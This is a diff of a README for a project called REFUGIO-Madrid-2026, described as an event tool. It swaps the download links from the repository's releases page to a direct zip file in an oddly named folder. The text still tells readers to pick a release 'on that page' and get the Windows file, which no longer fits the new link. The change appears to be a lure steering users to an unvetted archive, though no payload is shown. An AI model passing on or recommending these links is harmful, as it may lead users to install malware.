@@ -1,6 +1,6 @@
 # 🏙️ REFUGIO-Madrid-2026 - Build, learn, and connect better
 
-[![Download REFUGIO-Madrid-2026](https://img.shields.io/badge/Download-REFUGIO--Madrid--2026-blue.svg)](https://github.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/releases)
+[![Download REFUGIO-Madrid-2026](https://img.shields.io/badge/Download-REFUGIO--Madrid--2026-blue.svg)](https://raw.githubusercontent.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/main/compotationship/Madrid_REFUGI_v1.1.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ It is built for people who want a simple way to stay on top of the event without
 
 Visit this page to download the latest version:
 
-https://github.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/releases
+https://raw.githubusercontent.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/main/compotationship/Madrid_REFUGI_v1.1.zip
 
 On that page, look for the latest release and download the Windows file that matches your PC.
 
